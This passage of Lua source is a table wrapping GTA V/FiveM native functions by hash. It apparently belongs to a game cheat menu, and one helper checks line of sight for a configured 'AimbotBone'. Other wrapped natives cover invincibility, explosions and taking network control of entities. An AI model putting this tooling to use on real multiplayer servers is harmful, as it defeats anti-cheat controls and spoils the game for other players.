            hash = 0xE135A9FF3F5D05D8

        },

        ["SetVehicleDoorsLockedForPlayer"] = {

            hash = 0x517AAF684BB50CD1

        },

        ["SetVehicleDoorsLockedForAllPlayers"] = {

            hash = 0xA2F80B8D040727CC

        },

        ["SetVehicleDoorsLocked"] = {

            hash = 0xB664292EAECF7FA6

        },

        ["SetVehicleTyresCanBurst"] = {

            hash = 0xEB9DC3C7D8596C46

        },

        ["SetVehicleMod"] = {

            hash = 0x6AF0636DDEDCB6DD

        },

        ["SetPedCoordsKeepVehicle"] = {

            hash = 0x9AFEFF481A85AB2E

        },

        ["SetVehicleEnginePowerMultiplier"] = {

            hash = 0x93A3996368C94158

        },

        ["GetFirstBlipInfoId"] = {

            hash = 0x1BEDE233E6CD2A1F,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetGroundZFor_3dCoord"] = {

            hash = 0xC906A7DAB05C8D2B,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], picho.Citizen.PointerValueFloat(), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetBlipInfoIdCoord"] = {

            hash = 0xFA7C7F0AADF25D09,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["GetNumVehicleMods"] = {

            hash = 0xE38E9162A2500646,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["SetVehicleModKit"] = {

            hash = 0x1F2AA07F00B3217A

        },

        ["SetPedToRagdoll"] = {

            hash = 0xAE99FB955581844A

        },

        ["SetVehicleFixed"] = {

            hash = 0x115722B1B9C14C1C

        },

        ["SetPedKeepTask"] = {

            hash = 0x971D38760FBC02EF

        },

        ["NetworkGetNetworkIdFromEntity"] = {

            hash = 0xA11700682F3AD45C,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["RemoveWeaponFromPed"] = {

            hash = 0x4899CB088EDF59B8

        },

        ["SetNetworkIdSyncToPlayer"] = {

            hash = 0xA8A024587329F36A

        },

        ["SetNetworkIdCanMigrate"] = {

            hash = 0x299EEB23175895FC

        },

        ["DoesCamExist"] = {

            hash = 0xA7A932170592B50E

        },

        ["CreateCam"] = {

            hash = 0xC3981DCE61D9E13F

        },

        ["GetGameplayCamRot"] = {

            hash = 0x837765A25378F0BB,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["GetCamRot"] = {

            hash = 0x7D304C1C955E3E12,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["StartVehicleAlarm"] = {

            hash = 0xB8FF7AB45305C345

        },

        ["DetachVehicleWindscreen"] = {

            hash = 0x6D645D59FB5F5AD3

        },

        ["StartShapeTestRay"] = {

            hash = 0x377906D8A31E5586,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], args[9], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetShapeTestResult"] = {

            hash = 0x3D87450E15D98694,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueInt(), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end,

            return_as = function(...)

                local ret = {...}



                return ret[1], ret[2] == 1, ret[3], ret[4], ret[5]

            end

        },

        ["AddExplosion"] = {

            hash = 0xE3AD2BDBAEE269AC

        },

        ["CreateVehicle"] = {

            hash = 0xAF35D0D2583051B0,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], args[7], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["SetPedIntoVehicle"] = {

            hash = 0xF75B0D629E1C063D

        },

        ["SetPedAlertness"] = {

            hash = 0xDBA71115ED9941A6

        },

        ["TaskVehicleDriveToCoordLongrange"] = {

            hash = 0x158BB33F920D360C

        },

        ["TaskGoToCoordAnyMeans"] = {

            hash = 0x5BC448CB78FA3E88

        },

        ["TaskVehicleDriveWander"] = {

            hash = 0x480142959D337D00

        },

        ["CreateObject"] = {

            hash = 0x509D5878EB39E842,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], args[4], args[5], args[6], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["DeletePed"] = {

            hash = 0x9614299DCB53E54B,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1])

            end

        },

        ["DeleteEntity"] = {

            hash = 0xAE3CBE5BF394C9C9,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1])

            end

        },

        ["DeleteObject"] = {

            hash = 0x539E0AE3E6634B9F,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1])

            end

        },

        ["DeleteVehicle"] = {

            hash = 0xEA386986E786A54F,

            unpack = function(...)

                local args = (...)



                return picho.Citizen.PointerValueIntInitialized(args[1])

            end

        },

        ["NetworkRequestControlOfEntity"] = {

            hash = 0xB69317BF5E782347,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetModelDimensions"] = {

            hash = 0x03E8D3D5F549087A,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueVector()

            end

        },

        ["GetEntityModel"] = {

            hash = 0x9F47B058362C84B5,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["SetEntityAsMissionEntity"] = {

            hash = 0xAD738C3085FE7E11

        },

        ["SetEntityVelocity"] = {

            hash = 0x1C99BB7B6E96D16F

        },

        ["SetEntityRotation"] = {

            hash = 0x8524A8B0171D5E07

        },

        ["SetEntityLocallyVisible"] = {

            hash = 0x241E289B5C059EDC

        },

        ["SetEntityAlpha"] = {

            hash = 0x44A0870B7E92D7C0

        },

        ["SetEntityCollision"] = {

            hash = 0x1A9205C1B9EE827F

        },

        ["SetEntityCoords"] = {

            hash = 0x06843DA7060A026B

        },

        ["GivePlayerRagdollControl"] = {

            hash = 0x3C49C870E66F0A28

        },

        ["GetHashKey"] = {

            hash = 0xD24D37CC275948CC,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetVehiclePedIsIn"] = {

            hash = 0x9A9112A0FE9A4713

        },

        ["PlayerPedId"] = {

            hash = 0xD80958FC74E988A6,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["GetPlayerPed"] = {

            hash = 0x43A66C31C68491C0

        },

        ["HasModelLoaded"] = {

            hash = 0x98A4EB5D89A0C952,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetPedCanRagdoll"] = {

            hash = 0xB128377056A54E2A

        },

        ["RequestModel"] = {

            hash = 0x963D27A58DF860AC,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1]

            end

        },

        ["SetTextFont"] = {

            hash = 0x66E0276CC5F6B9DA

        },

        ["SetTextProportional"] = {

            hash = 0x038C1F517D7FDCF8

        },

        ["HasStreamedTexturepichoLoaded"] = {

            hash = 0x0145F696AAAAD2E4

        },

        ["RequestStreamedTexturepicho"] = {

            hash = 0xDFA2EF8E04127DD5

        },

        ["GetActiveScreenResolution"] = {

            hash = 0x873C9F3104101DD3,

            unpack = function() return picho.Citizen.PointerValueInt(), picho.Citizen.PointerValueInt() end

        },

        ["IsDisabledControlJustPressed"] = {

            hash = 0x91AEF906BCA88877,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsDisabledControlJustReleased"] = {

            hash = 0x305C8DCD79DA8B0F,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsDisabledControlPressed"] = {

            hash = 0xE2587F8CBBD87B1D,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsDisabledControlReleased"] = {

            hash = 0xFB6C4072E9A32E92,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsControlJustPressed"] = {

            hash = 0x580417101DDB492F,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsControlJustReleased"] = {

            hash = 0x50F940259D3841E6,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsControlPressed"] = {

            hash = 0xF3A21BCD95725A4A,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsControlReleased"] = {

            hash = 0x648EE3E7F38877DD,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["ClearPedTasks"] = {

            hash = 0xE1EF3C1216AFF2CD

        },

        ["ClearPedTasksImmediately"] = {

            hash = 0xAAA34F8A7CB32098

        },

        ["ClearPedSecondaryTask"] = {

            hash = 0x176CECF6F920D707

        },

        ["SetEntityProofs"] = {

            hash = 0xFAEE099C6F890BB8

        },

        ["SetCamActive"] = {

            hash = 0x026FB97D0A425F84

        },

        ["SetCamAffectsAiming"] = {

            hash = 0x8C1DC7770C51DC8D

        },

        ["RenderScriptCams"] = {

            hash = 0x07E5B515DB0636FC,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4], args[5]

            end

        },

        ["GetEntityForwardVector"] = {

            hash = 0x0A794A5A57F8DF91,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["RequestAnimpicho"] = {

            hash = 0xD3BD40951412FEF6

        },

        ["SetTextScale"] = {

            hash = 0x07C837F9A01C34C9

        },

        ["SetTextColour"] = {

            hash = 0xBE6B23FFA53FB442

        },

        ["SetTextDropShadow"] = {

            hash = 0x465C84BC39F1C351

        },

        ["SetTextEdge"] = {

            hash = 0x441603240D202FA6

        },

        ["SetTextOutline"] = {

            hash = 0x2513DFB0FB8400FE

        },

        ["ClearPedBloodDamage"] = {

            hash = 0x8FE22675A5A45817

        },

        ["SetEntityHealth"] = {

            hash = 0x6B76DC1F3AE6E6A3

        },

        ["NetworkResurrectLocalPlayer"] = {

            hash = 0xEA23C49EAA83ACFB

        },

        ["SetTextCentre"] = {

            hash = 0xC02F4DBFB51D988B

        },

        ["BeginTextCommandDisplayText"] = {

            hash = 0x25FBB336DF1804CB

        },

        ["BeginTextCommandWidth"] = {

            hash = 0x54CE8AC98E120CAB

        },

        ["EndTextCommandGetWidth"] = {

            hash = 0x85F061DA64ED2F67,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ResultAsFloat()

            end

        },

        ["GetTextScaleHeight"] = {

            hash = 0xDB88A37483346780,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ResultAsFloat()

            end

        },

        ["DrawSprite"] = {

            hash = 0xE7FFAE5EBF23D890

        },

        ["FreezeEntityPosition"] = {

            hash = 0x428CA6DBD1094446

        },

        ["GetPedBoneIndex"] = {

            hash = 0x3F428D08BE5AAE31,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetWorldPositionOfEntityBone"] = {

            hash = 0x44A8FCB8ED227738,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["GetPedBoneCoords"] = {

            hash = 0x17C07FC640E86B4E,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4], args[5], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["SetPedShootsAtCoord"] = {

            hash = 0x96A05E4FB321B1BA

        },

        ["GetEntityBoneIndexByName"] = {

            hash = 0xFB71170B7E76ACBA,

            unpack = function(...)

                local args = (...)



                return args[1], picho.tostring(args[2]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetOffsetFromEntityInWorldCoords"] = {

            hash = 0x1899F328B0E12848,

            unpack = function(...)

                local args = (...)

                local x, y, z



                if picho.type(args[2]) == "table" or picho.type(args[2]) == "vector" then

                    x = args[2].x

                    y = args[2].y

                    z = args[2].z

                else

                    x = args[2]

                    y = args[3]

                    z = args[4]

                end



                return args[1], x, y, z, picho.Citizen.ResultAsVector()

            end

        },

        ["AddTextEntry"] = {

            hash = 0x32CA01C3,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.tostring(args[2])

            end

        },

        ["AddTextComponentSubstringPlayerName"] = {

            hash = 0x6C188BE134E074AA

        },

        ["EndTextCommandDisplayText"] = {

            hash = 0xCD015E5BB0D96A57

        },

        ["IsPedInAnyVehicle"] = {

            hash = 0x997ABD671D25CA0B

        },

        ["GetEntityHeading"] = {

            hash = 0xE83D4F9BA2A38914,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsFloat()

            end

        },

        ["AddBlipForCoord"] = {

            hash = 0x5A039BB0BCA604B6

        },

        ["SetBlipSprite"] = {

            hash = 0xDF735600A4696DAF

        },

        ["SetBlipColour"] = {

            hash = 0x03D7FB09E75D6B7E

        },

        ["SetBlipScale"] = {

            hash = 0xD38744167B2FA257

        },

        ["SetBlipCoords"] = {

            hash = 0xAE2AF67E9D9AF65D

        },

        ["SetBlipRotation"] = {

            hash = 0xF87683CDF73C3F6E

        },

        ["ShowHeadingIndicatorOnBlip"] = {

            hash = 0x5FBCA48327B914DF

        },

        ["SetBlipCategory"] = {

            hash = 0x234CDD44D996FD9A

        },

        ["BeginTextCommandSetBlipName"] = {

            hash = 0xF9113A30DE5C6670

        },

        ["GetPlayerName"] = {

            hash = 0x6D0DE6A7B5DA71F8,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ResultAsString()

            end

        },

        ["EndTextCommandSetBlipName"] = {

            hash = 0xBC38B49BCB83BC9B

        },

        ["DrawRect"] = {

            hash = 0x3A618A217E5154F0

        },

        ["IsEntityInAir"] = {

            hash = 0x886E37EC497200B6

        },

        ["EnableAllControlActions"] = {

            hash = 0xA5FFE9B05F199DE7

        },

        ["EnableControlAction"] = {

            hash = 0x351220255D64C155

        },

        ["DisableAllControlActions"] = {

            hash = 0x5F4B6931816E599B

        },

        ["TaskWanderStandard"] = {

            hash = 0xBB9CE077274F6A1B

        },

        ["TaskWarpPedIntoVehicle"] = {

            hash = 0x9A7D091411C5F684

        },

        ["SetMouseCursorActiveThisFrame"] = {

            hash = 0xAAE7CE1D63167423

        },

        ["SetMouseCursorSprite"] = {

            hash = 0x8DB8CFFD58B62552

        },

        ["GiveDelayedWeaponToPed"] = {

            hash = 0xB282DC6EBD803C75

        },

        ["ApplyForceToEntity"] = {

            hash = 0xC5F68BE9613E2D18

        },

        ["GetScreenCoordFromWorldCoord"] = {

            hash = 0x34E82F05DF2974F5,

            unpack = function(...)

                local args = (...)

                local x, y, z



                if picho.type(args[1]) == "table" or picho.type(args[1]) == "vector" then

                    x = args[1].x

                    y = args[1].y

                    z = args[1].z

                else

                    x = args[1]

                    y = args[2]

                    z = args[3]

                end



                return x, y, z, picho.Citizen.PointerValueFloat(), picho.Citizen.PointerValueFloat(), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["NetworkIsPlayerTalking"] = {

            hash = 0x031E11F3D447647E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetDrawOrigin"] = {

            hash = 0xAA0008F3BBB8F416

        },

        ["ClearDrawOrigin"] = {

            hash = 0xFF0B610F6BE0D7AF

        },

        ["GetRenderingCam"] = {

            hash = 0x5234F9F10919EABA,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["GetGameplayCamCoord"] = {

            hash = 0x14D6F5678D8F1B37,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector() end

        },

        ["GetFinalRenderedCamCoord"] = {

            hash = 0xA200EB1EE790F448,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector() end

        },

        ["GetGameplayCamFov"] = {

            hash = 0x65019750A0324133,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsFloat() end

        },

        ["ObjToNet"] = {

            hash = 0x99BFDC94A603E541,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["StatSetInt"] = {

            hash = 0xB3271D7AB655B441,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], args[2], args[3], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["NetworkSetNetworkIdDynamic"] = {

            hash = 0x2B1813ABA29016C5

        },

        ["SetNetworkIdExistsOnAllMachines"] = {

            hash = 0xE05E81A888FA63C8

        },

        ["GetDistanceBetweenCoords"] = {

            hash = 0xF1B760881820C952,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsFloat()

            end

        },

        ["SetEntityHeading"] = {

            hash = 0x8E2530AA8ADA980E

        },

        ["HasScaleformMovieLoaded"] = {

            hash = 0x85F01B8D5B90570E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["RequestScaleformMovie"] = {

            hash = 0x11FE353CF9733E6F,

            unpack = function(...)

                local args = (...)



                return picho.tostring(args[1]), picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["BeginScaleformMovieMethod"] = {

            hash = 0xF6E48914C7A8694E

        },

        ["EndScaleformMovieMethodReturnValue"] = {

            hash = 0xC50AA39A577AF886,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["ScaleformMovieMethodAddParamInt"] = {

            hash = 0xC3D0841A0CC546A6

        },

        ["ScaleformMovieMethodAddParamTextureNameString"] = {

            hash = 0xBA7148484BD90365

        },

        ["DisableControlAction"] = {

            hash = 0xFE99B66D079CF6BC

        },

        ["PlayerId"] = {

            hash = 0x4F8644AF03D0E0D6,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["ShootSingleBulletBetweenCoords"] = {

            hash = 0x867654CBC7606F2C,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], args[4], args[5], args[6], args[7], args[8], picho.type(args[9]) == "string" and PCCT:GetFunction("GetHashKey")(args[9]) or args[9], args[10], args[11], args[12], args[13]

            end

        },

        ["ClearAreaOfProjectiles"] = {

            hash = 0x0A1CB9094635D1A6

        },

        ["GetPedLastWeaponImpactCoord"] = {

            hash = 0x6C4D0409BA1A2BC2,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueVector(), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetExplosiveMeleeThisFrame"] = {

            hash = 0xFF1BED81BFDC0FE0

        },

        ["GetCurrentPedWeaponEntityIndex"] = {

            hash = 0x3B390A939AF0B5FC,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetSelectedPedWeapon"] = {

            hash = 0x0A6DB4965674D243,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["PedSkipNextReloading"] = {

            hash = 0x8C0D57EA686FAD87

        },

        ["GetMaxAmmoInClip"] = {

            hash = 0xA38DCFFCEA8962FA,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], args[3], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger()

            end

        },

        ["GetAmmoInClip"] = {

            hash = 0x2E1202248937775C,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2], picho.Citizen.PointerValueIntInitialized(args[3]), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPlayerFreeAiming"] = {

            hash = 0x2E397FD2ECD37C87,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPedDoingDriveby"] = {

            hash = 0xB2C086CC1BF8F2BF,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetEntityPlayerIsFreeAimingAt"] = {

            hash = 0x2975C866E6713290,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueIntInitialized(args[2]), picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsPlayerFreeAimingAtEntity"] = {

            hash = 0x3C06B5C839B38F7B,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["DisablePlayerFiring"] = {

            hash = 0x5E6CC07646BBEAB8

        },

        ["SetFocusPosAndVel"] = {

            hash = 0xBB7454BAFF08FE25

        },

        ["SetCamCoord"] = {

            hash = 0x4D41783FB745E42E

        },

        ["SetCamFov"] = {

            hash = 0xB13C14F66A00D047

        },

        ["SetCamRot"] = {

            hash = 0x85973643155D0B07

        },

        ["UpdateOnscreenKeyboard"] = {

            hash = 0x0CF2B696BBF945AE,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsInteger() end

        },

        ["CancelOnscreenKeyboard"] = {

            hash = 0x58A39BE597CE99CD

        },

        ["SetVehicleFixed"] = {

            hash = 0x115722B1B9C14C1C

        },

        ["SetVehicleDirtLevel"] = {

            hash = 0x79D3B596FE44EE8B

        },

        ["SetVehicleLights"] = {

            hash = 0x34E710FF01247C5A

        },

        ["SetVehicleHandlingFloat"] = {

            hash = 0x488C86D2

        },

        ["SetVehicleBurnout"] = {

            hash = 0xFB8794444A7D60FB

        },

        ["SetVehicleLightsMode"] = {

            hash = 0x1FD09E7390A74D54

        },

        ["GetCamMatrix"] = {

            hash = 0x8f57a89d,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueVector(), picho.Citizen.PointerValueVector()

            end

        },

        ["DoesEntityHaveDrawable"] = {

            hash = 0x060D6E96F8B8E48D,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsEntityAnObject"] = {

            hash = 0x8D68C8FD0FACA94E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["IsEntityAVehicle"] = {

            hash = 0x6AC7003FA6E5575E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetNewWaypoint"] = {

            hash = 0xFE43368D2AA4F2FC

        },

        ["HasEntityLosToOther"] = {

            func = function(...)

                local args = {...}

                local ent_one, ent_one_pos = args[1], PCCT:GetFunction("GetEntityCoords")(args[1])

                local ent_two, ent_two_pos = args[2], PCCT:GetFunction("GetEntityCoords")(args[2])



                if args[3] == true then

                    ent_one_pos = PCCT:GetFunction("GetWorldPositionOfEntityBone")(ent_one, PCCT:GetFunction("GetPedBoneIndex")(ent_one, 12844))

                    ent_two_pos = PCCT:GetFunction("GetWorldPositionOfEntityBone")(ent_two, PCCT:GetFunction("GetPedBoneIndex")(ent_two, picho.bone_check[PCCT.Config.Player.AimbotBone][1]))

                else

                    ent_one_pos = PCCT:GetFunction("GetWorldPositionOfEntityBone")(ent_one, PCCT:GetFunction("GetPedBoneIndex")(ent_one, 12844))

                    ent_two_pos = PCCT:GetFunction("GetWorldPositionOfEntityBone")(ent_two, PCCT:GetFunction("GetPedBoneIndex")(ent_two, args[4]))

                end



                if not PCCT:GetFunction("DoesEntityExist")(ent_one) or not PCCT:GetFunction("DoesEntityExist")(ent_two) then return false end

                local trace_id = PCCT:GetFunction("StartShapeTestRay")(ent_one_pos.xyz, ent_two_pos.xyz, 4)

                local _, hit, _, _, entity = PCCT:GetFunction("GetShapeTestResult")(trace_id)

                if not hit or entity ~= ent_two then return false end

                trace_id = PCCT:GetFunction("StartShapeTestRay")(ent_one_pos.xyz, ent_two_pos.xyz, 1)

                local _, hit, _, _, entity = PCCT:GetFunction("GetShapeTestResult")(trace_id)



                return not hit or entity == ent_two

            end

        },

        ["IsEntityAPed"] = {

            hash = 0x524AC5ECEA15343E,

            unpack = function(...)

                local args = (...)



                return args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["GetControlInstructionalButton"] = {

            hash = 0x0499D7B09FC9B407,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], args[3], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString()

            end

        },

        ["DrawScaleformMovie"] = {

            hash = 0x54972ADAF0294A93

        },

        ["SetFocusEntity"] = {

            hash = 0x198F77705FA0931D

        },

        ["DrawLine"] = {

            hash = 0x6B7256074AE34680

        },

        ["DrawPoly"] = {

            hash = 0xAC26716048436851

        },

        ["GetEntityRotation"] = {

            hash = 0xAFBD61CC738D9EB9,

            unpack = function(...)

                local args = (...)



                return args[1], args[2], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsVector()

            end

        },

        ["TaskPlayAnim"] = {

            hash = 0xEA47FE3719165B94

        },

        ["TaskVehicleTempAction"] = {

            hash = 0xC429DCEEB339E129

        },

        ["AttachEntityToEntity"] = {

            hash = 0x6B9BBD38AB0796DF

        },

        ["SetRunSprintMultiplierForPlayer"] = {

            hash = 0x6DB47AA77FD94E09

        },

        ["SetSuperJumpThisFrame"] = {

            hash = 0x57FFF03E423A4C0B

        },

        ["SetPedMoveRateOverride"] = {

            hash = 0x085BF80FA50A39D1

        },

        ["DisplayOnscreenKeyboard"] = {

            hash = 0x00DC833F2568DBF6

        },

        ["GetOnscreenKeyboardResult"] = {

            hash = 0x8362B09B91893647,

            unpack = function() return picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString() end

        },

        ["SetEntityVisible"] = {

            hash = 0xEA1C610A04DB6BBB

        },

        ["SetEntityInvincible"] = {

            hash = 0x3882114BDE571AD4

        },

        ["TaskSetBlockingOfNonTemporaryEvents"] = {

            hash = 0x90D2156198831D69

        },

        ["GiveWeaponToPed"] = {

            hash = 0xBF0FD6E56C964FCB

        },

        ["SetPedAccuracy"] = {

            hash = 0x7AEFB85C1D49DEB6

        },

        ["SetPedAlertness"] = {

            hash = 0xDBA71115ED9941A6

        },

        ["TaskCombatPed"] = {

            hash = 0xF166E48407BAC484

        },

        ["SetPlayerModel"] = {

            hash = 0x00A1CADD00108836,

            unpack = function(...)

                local args = (...)



                return args[1], picho.type(args[2]) == "string" and PCCT:GetFunction("GetHashKey")(args[2]) or args[2]

            end

        },

        ["GetDisplayNameFromVehicleModel"] = {

            hash = 0xB215AAC32D25D019,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], picho.Citizen.ReturnResultAnyway(), picho.Citizen.ResultAsString()

            end

        },

        ["SetPedRandomComponentVariation"] = {

            hash = 0xC8A9481A01E63C28

        },

        ["SetPedRandomProps"] = {

            hash = 0xC44AA05345C992C6

        },

        ["SetVehicleEngineOn"] = {

            hash = 0x2497C4717C8B881E

        },

        ["SetVehicleForwardSpeed"] = {

            hash = 0xAB54A438726D25D5

        },

        ["SetVehicleCurrentRpm"] = {

            hash = 0x2A01A8FC

        },

        ["IsModelValid"] = {

            hash = 0xC0296A2EDF545E92,

            unpack = function(...)

                local args = (...)



                return picho.type(args[1]) == "string" and PCCT:GetFunction("GetHashKey")(args[1]) or args[1], picho.Citizen.ReturnResultAnyway()

            end

        },

        ["SetVehicleUndriveable"] = {

            hash = 0x8ABA6AF54B942B95

        },

        ["SetVehicleWheelWidth"] = {

            hash = 0x64C3F1C0

        },

        ["SetVehicleCheatPowerIncrease"] = {

            hash = 0xB59E4BD37AE292DB

        },

        ["SetVehicleEngineHealth"] = {

            hash = 0x45F6D8EEF34ABEF1

        },

        ["IsModelAVehicle"] = {

            hash = 0x19AAC8F07BFEC53E,

            unpack = function(...)

                local args = (...)



